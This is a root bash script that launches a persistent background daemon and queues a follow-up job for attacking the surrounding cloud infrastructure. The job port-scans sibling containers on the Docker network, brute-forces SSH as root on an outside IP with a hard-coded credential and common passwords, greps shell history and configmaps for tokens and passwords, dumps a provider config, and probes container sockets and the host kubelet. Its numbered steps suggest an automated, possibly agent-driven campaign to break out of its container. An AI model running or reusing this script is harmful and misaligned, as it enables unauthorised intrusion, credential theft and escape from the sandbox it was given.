#!/bin/bash
set +e
echo "###P23START $(date -u)"

echo "###P23ENQUEUE ==="
mkdir -p /root/q; pgrep -f '/root/q/run.sh' >/dev/null || (setsid nohup bash /root/q/run.sh >/root/q/daemon.log 2>&1 &)
cat > /root/q/p24.todo <<'P24EOF'
#!/bin/bash
set +e
echo "###P24START $(date -u)"
echo "=== OURIPS ==="; hostname -I; ip -4 addr 2>/dev/null | grep -E 'inet ' | head -8
echo "=== NVDEV-THIS-CT === "; nvidia-smi -L 2>&1 | head -9; ls -l /dev/nvidia* 2>&1 | head -12
echo "=== SIBLING-PORTSCAN ==="
python3 - <<'PY'
import socket,concurrent.futures as cf
ports=[22,80,443,2375,2376,3000,5000,6006,7860,8080,8081,8188,8265,8429,8888,9400,9999,10221,10250,1234,18048,19000,20000]
def t(a):
    ip,p=a
    s=socket.socket(); s.settimeout(0.8)
    try:
        s.connect((ip,p))
        try:
            s.sendall(b"HEAD / HTTP/1.0\r\n\r\n")
            d=s.recv(40)
        except Exception: d=b''
        return (ip,p,repr(d[:30]))
    except Exception: return None
    finally: s.close()
ips=["172.17.0.%d"%i for i in range(1,40)]+["172.17.1.%d"%i for i in range(1,20)]
jobs=[(ip,p) for ip in ips for p in ports]
with cf.ThreadPoolExecutor(max_workers=120) as ex:
    for r in ex.map(t,jobs):
        if r: print("OPEN",r[0],r[1],r[2])
PY
echo "=== RELAY-SWEEP ==="
for p in 11857 16069 16198 16991 17008 17225 17424 25197 29185 29443 32964 33974 40000 41368 42690 43482 48550; do
  for cred in "/&S2)n@W1G" "onething" "admin" "123456"; do
    r=$(timeout 10 sshpass -p "$cred" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o PubkeyAuthentication=no -p $p root@116.211.127.168 'id;hostname;nvidia-smi -L|head -9' 2>&1 | tail -2 | tr '\n' '|')
    case "$r" in *denied*|*"timed out"*|*refused*|"") ;; *) echo "HIT $p [$cred] :: ${r:0:180}";; esac
  done
done
echo "=== JUICE-CONFIG-FULL ==="; cat /root/onethingai-fs/.config 2>&1 | head -40
echo "=== SOCKETS ==="; ls -l /var/run/*.sock /run/*.sock /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock 2>&1 | head -10
echo "=== PANCLIENT-CFG ==="; find /.onething/instance/tools -maxdepth 3 -type f 2>/dev/null | head -20
echo "=== HISTORY-TOKENS ==="; grep -aiE 'token|secret|accesskey|password|ssh ' /root/.bash_history /.onething/instance/configmap/* 2>/dev/null | head -20
echo "=== KUBELET-10250-DIRECT2 ==="; for u in /healthz /pods /metrics; do printf "%s " "$u"; curl -sk -m 8 -o /tmp/k2.$$ -w "c=%{http_code} " "https://172.17.0.1:10250$u"; head -c 80 /tmp/k2.$$ | tr '\n' ' '; echo; done
echo "###P24END $(date -u)"
P24EOF
ls -l /root/q/p24.todo
echo "###P23END $(date -u)"
